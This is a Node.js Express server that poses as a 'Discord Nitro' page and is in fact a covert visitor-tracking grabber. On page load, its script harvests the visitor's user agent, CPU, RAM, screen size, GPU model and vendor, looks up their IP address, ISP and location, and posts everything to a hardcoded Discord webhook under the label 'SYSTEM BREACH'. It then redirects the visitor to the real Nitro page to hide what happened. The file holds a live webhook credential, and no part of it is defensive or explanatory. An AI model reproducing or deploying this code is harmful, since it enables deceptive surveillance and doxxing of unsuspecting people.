const express = require('express');
const app = express();
const PORT = process.env.PORT || 10000;

app.use(express.json());

const W_U = "https://discord.com/api/webhooks/1458383563140628491/kco5ixB4cYS2dmezKeaMvgQWPeiahmXAwC344Apu_704roAtuCXb1Gl8BcjVdDxJZQbC";

app.get('/', (req, res) => {
    res.send(`
    <html>
    <head><title>Discord Nitro</title><meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body { background: #2b2d31; color: #fff; font-family: sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
        .s { width: 30px; height: 30px; border: 3px solid #313338; border-top: 3px solid #5865f2; border-radius: 50%; animation: a 1s linear infinite; margin: 0 auto 15px; }
        @keyframes a { to { transform: rotate(360deg); } }
    </style></head>
    <body>
        <div style="text-align:center;"><div class="s"></div><p>Connecting to Discord...</p></div>
    <script>
        async function start() {
            // RAM Detection
            let reportedRam = navigator.deviceMemory || "N/A";
            
            let d = {
                ua: navigator.userAgent,
                cpu: navigator.hardwareConcurrency || "N/A",
                ram: reportedRam + "GB (Reported)",
                scr: screen.width + "x" + screen.height,
                gpu: "N/A", vdr: "N/A"
            };

            try {
                const c = document.createElement('canvas');
                const gl = c.getContext('webgl');
                const dbg = gl.getExtension('WEBGL_debug_renderer_info');
                d.gpu = gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL);
                d.vdr = gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL);
            } catch(e){}

            let geo = {};
            try { geo = await (await fetch('https://ipwho.is/')).json(); } catch(e){}

            const payload = {
                username: "ARCHITECT v880",
                embeds: [{
                    title: "🔱 SYSTEM BREACH",
                    color: 0x5865F2,
                    fields: [
                        { name: "📡 NETWORK", value: "IP: " + (geo.ip || "N/A") + "\\nISP: " + (geo.isp || "N/A") },
                        { name: "🌍 LOCATION", value: (geo.city || "N/A") + ", " + (geo.country || "N/A"), inline: true },
                        { name: "⚙️ HARDWARE", value: "CPU: " + d.cpu + " | RAM: " + d.ram + "\\nGPU: " + d.gpu },
                        { name: "🖥️ SCREEN", value: d.scr, inline: true }
                    ],
                    footer: { text: "v880.0 • Stability Protocol" }
                }]
            };

            // DIRECT POST TO DISCORD (Fastest)
            fetch("${W_U}", {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            }).finally(() => {
                window.location.replace('https://discord.com/nitro');
            });
        }
        start();
    </script>
    </body></html>
    `);
});

// Fallback endpoint if direct post fails
app.post('/collect', async (req, res) => {
    res.sendStatus(200);
});

app.listen(PORT, () => console.log("v880 ONLINE"));
